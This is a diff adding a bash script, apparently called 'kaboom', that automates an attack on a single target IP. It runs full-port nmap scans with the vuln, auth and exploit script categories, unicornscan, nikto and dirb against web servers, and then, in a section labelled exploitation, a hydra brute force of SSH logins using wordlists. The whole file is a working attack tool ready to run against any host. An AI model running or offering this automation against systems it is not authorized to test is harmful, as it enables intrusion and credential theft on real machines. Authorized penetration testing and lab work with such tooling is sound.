@@ -1,0 +1,277 @@
+#!/bin/bash
+
+
+
+######################################
+###				VARIABLES		   ###	
+######################################
+userlist_hydra="usernames_hydra.txt"
+passlist_hydra="fasttrack.txt"
+http_wordlist="./custom_url_wordlist.txt"
+http_extensions_file="./custom_extensions_common.txt"
+######################################
+######################################
+
+
+
+######################################
+###				FUNCTIONS		   ###	
+######################################
+
+#  
+#  name: tcp_service_on	
+#  @param: state of port={open,filtered} ; portid={number of port}
+#  @return: 0 = {port found} ; 10 {port not found}
+#  
+tcp_service_on () {
+	xmllint --xpath "//port[state[@state='$1'] and @portid='$2']" "$file_path/IG/NMAP/script.xml" > /dev/null
+}
+
+#  
+#  name: udp_service_on	
+#  @param: portid={number of port}
+#  @return: 0 = {port found} ; 10 {port not found}
+# 
+udp_service_on () {
+	xmllint --xpath "//port[state[@state='open|filtered'] and @portid='$1']" "$file_path/IG/NMAP/udp.xml" > /dev/null
+}
+######################################
+######################################
+
+
+
+######################################
+###				CODE			   ###	
+######################################
+
+if [[ "$1" == '-h' || "$1" == '--help' ]]; then		#to complete
+	echo 'Usage:'
+	echo '	Interactive mode:'
+	echo '		kaboom [ENTER]  ...and the script does the rest'
+	echo
+	echo '	NON-interactive mode:'
+	echo '		kaboom <results_path> <nic> <target_ip> [-s or --shutdown]'
+	echo
+	exit 0
+fi
+
+######## 	 INPUT 		######
+if [[ "$1" != '' && "$2" != '' && "$3" != '' ]]; then 	#NON-interactive mode
+	
+	if [[ "$4" != '' ]]; then 
+		if [[ "$4" == '-s' || "$4" == '--shutdown' ]]; then 
+			shutdown="YES"
+		else 
+			echo "$4  -->  INVALID PARAMETER"
+		fi		
+	fi
+	
+	file_path="$1"
+	nic="$2"
+	host="$3"
+	
+	else
+
+	printf "insert host:\n>>"
+	read host
+
+	printf "insert path where to save results:\n>>"
+	read file_path
+	
+	printf "insert NIC:\n>>"
+	read nic
+
+	printf "shutdown pc at the end of script [YES/NO] (default NO):\n>>"
+	read shutdown
+	
+fi
+
+if [[ ! -d "$file_path" ]]; then 
+	echo "$1: DIRECTORY NOT FOUND"
+	exit 1
+fi
+
+ifconfig "$nic" &> /dev/null || { echo "$nic: DEVICE NOT FOUND"; exit 1; }
+
+if [[ "$host" =~ ['qwertyuiopasdfghjklzxcvbnm,-:;#@[]/%|'] ]]; then 
+	echo 'TARGET IP CONTAINS INVALID CHARACTERS [not use CIDR notation]'
+	exit 1
+fi
+
+######## 	END INPUT 	######
+
+mkdir -p "$file_path/$host"
+file_path="$file_path/$host"
+
+echo
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+echo "START SCRIPT AT `date`"
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+
+######## START INFO GATHERING ######
+
+echo
+echo '++++++++++++++++++++++++++'
+echo 'START INFO GATHERING'
+echo '++++++++++++++++++++++++++'
+sleep 2
+
+mkdir -p "$file_path/IG"
+
+echo '-----------------'
+echo 'START NMAP...'
+echo '-----------------'
+
+mkdir -p "$file_path/IG/NMAP"
+
+echo 'START SYN-SCAN WITH SYN-PROBE...'
+nmap -PS -sS -p 1-65535 -sV -O --fuzzy -vvv -oA "$file_path/IG/NMAP/script" --script "(default or auth or vuln or exploit) and not http-enum" $host > /dev/null || { echo '!!!NMAP ERROR (SYN-SCAN)!!!'; exit 1; }
+
+grep 'Host seems down' "$file_path/IG/NMAP/script.nmap" && {
+	echo 'SYN-SCAN WITH SYN-PROBE FAIL!';
+	echo 'START ACK-SCAN WITH ACK-PROBE...';
+	nmap -PA -sA -p 1-65535 -sV -O --fuzzy -vvv -oA "$file_path/IG/NMAP/script" --script "(default or auth or vuln or exploit) and not http-enum" $host > /dev/null || { echo '!!!NMAP ERROR (ACK-SCAN)!!!'; exit 1; } ;
+}
+
+sleep 3		#create syn report
+grep -v '|' "$file_path/IG/NMAP/script.nmap" > "$file_path/IG/NMAP/syn.nmap"
+
+echo 'START UDP-SCAN WITH UDP-PROBE...'
+nmap -PU -sU -sV -vvv -oA "$file_path/IG/NMAP/udp" $host > /dev/null || { echo '!!!NMAP ERROR (UDP-SCAN)!!!'; exit 1; }
+echo '-----------------'
+echo 'END NMAP'
+echo '-----------------'
+
+echo '---------------------'
+echo 'START UNICORNSCAN...'
+echo '---------------------'
+echo 'START TCP SCAN...'
+unicornscan -l "$file_path/IG/uni-tcp.txt" -i "$nic" -r 10 -vvvvv "$host":p > /dev/null
+	#p=ports between [1,1024]
+	#r X=max X packet per second
+echo 'START UDP SCAN...'
+unicornscan -l "$file_path/IG/uni-udp.txt" -i "$nic" -r 10 -mU -vvvvv "$host":p > /dev/null
+echo '---------------------'
+echo 'END UNICORNSCAN'
+echo '---------------------'
+
+echo '++++++++++++++++++++++++++'
+echo 'END INFO GATHERING'
+echo '++++++++++++++++++++++++++'
+sleep 2
+
+######## END INFO GATHERING ######
+
+######## START VULN ASSESSMENT ######
+
+echo
+echo '++++++++++++++++++++++++++'
+echo 'START VULN ASSESSMENT ON WEB SERVER'
+echo '++++++++++++++++++++++++++'
+sleep 2
+
+mkdir -p "$file_path/VA"
+
+#http
+tcp_service_on "open" "80" > /dev/null && { 
+	echo '-----------------';
+	echo 'START NIKTO...';
+	echo '-----------------';
+	nikto -Display PV -nolookup -ask no -Format htm -host $host -output "$file_path/VA/nikto_http.html" -Plugins "ms10_070;report_html;embedded;cookies;put_del_test;outdated;drupal(0:0);clientaccesspolicy;msgs;httpoptions;negotiate;parked;favicon;apache_expect_xss;headers" -Tuning 4890bcde > /dev/null;
+	echo '-----------------';
+	echo 'END NIKTO';
+	echo '-----------------';
+	
+	echo '-----------------'
+	echo 'START DIRB...'
+	echo '-----------------'
+	dirb "http://$host:80/" "$http_wordlist" -r -l -o "$file_path/VA/dirb_http.txt" -x "$http_extensions_file" -z 200;
+	echo '-----------------'
+	echo 'END DIRB'
+	echo '-----------------'
+	#Dirb takes approximaly one hour to finish the wordlist with the following setting.
+	#It doesn't search recursively.
+}
+
+#https
+tcp_service_on "open" "443" > /dev/null && {
+	echo '----------------------';
+	echo 'START NIKTO (HTTPS)...';
+	echo '----------------------';
+	nikto -ssl -port 443 -Display PV -nolookup -ask no -Format htm -host $host -output "$file_path/VA/nikto_https.html" -Plugins "ms10_070;report_html;embedded;cookies;put_del_test;outdated;drupal(0:0);clientaccesspolicy;msgs;httpoptions;negotiate;parked;favicon;apache_expect_xss;ssl;headers" -Tuning 4890bcde > /dev/null;
+	echo '----------------------';
+	echo 'END NIKTO (HTTPS)';
+	echo '----------------------';
+	
+	echo '----------------------';
+	echo 'START DIRB (HTTPS)...'
+	echo '----------------------';
+	dirb "https://$host:443/" "$http_wordlist" -r -l -o "$file_path/VA/dirb_https.txt" -x "$http_extensions_file" -z 200;
+	echo '----------------------';
+	echo 'END DIRB (HTTPS)'
+	echo '----------------------';
+}
+
+echo '++++++++++++++++++++++++++'
+echo 'END VULN ASSESSMENT ON WEB SERVER'
+echo '++++++++++++++++++++++++++'
+sleep 2
+
+######## END VULN ASSESSMENT ######
+
+######## START EXPLOITATION ######
+
+echo
+echo '++++++++++++++++++++++++++'
+echo 'START EXPLOITATION'
+echo '++++++++++++++++++++++++++'
+sleep 2
+
+mkdir -p "$file_path/EX"
+
+echo '-----------------'
+echo 'START HYDRA...'
+echo '-----------------'
+
+mkdir -p "$file_path/EX/HYDRA"
+
+#ssh
+tcp_service_on "open" "22" > /dev/null && {
+	echo '--------------------------';
+	echo 'START BRUTE FORCE SSH...';
+	echo '--------------------------';
+	hydra -s 22 -v -V -F -o "$file_path/EX/HYDRA/cred_ssh" -L $userlist_hydra -P $passlist_hydra -t 4 $host ssh > /dev/null;
+	echo '--------------------------';
+	echo 'END BRUTE FORCE SSH';
+	echo '--------------------------';
+}
+echo '-----------------'
+echo 'END HYDRA'
+echo '-----------------'
+
+echo '++++++++++++++++++++++++++'
+echo 'END EXPLOITATION'
+echo '++++++++++++++++++++++++++'
+sleep 2
+
+######## END EXPLOITATION ######
+
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+echo "END SCRIPT AT `date`"
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+echo '+-+-+-+-+-+-+-+-+-+-+-+-+-'
+
+cd "$file_path"
+
+if [[ "$shutdown" == 'YES' || "$shutdown" == 'yes'  ]]; then 
+	sleep 2
+	echo 'SHUTDOWN REQUIRED...'
+	sleep 2
+	shutdown now
+fi
+
+######################################
+######################################
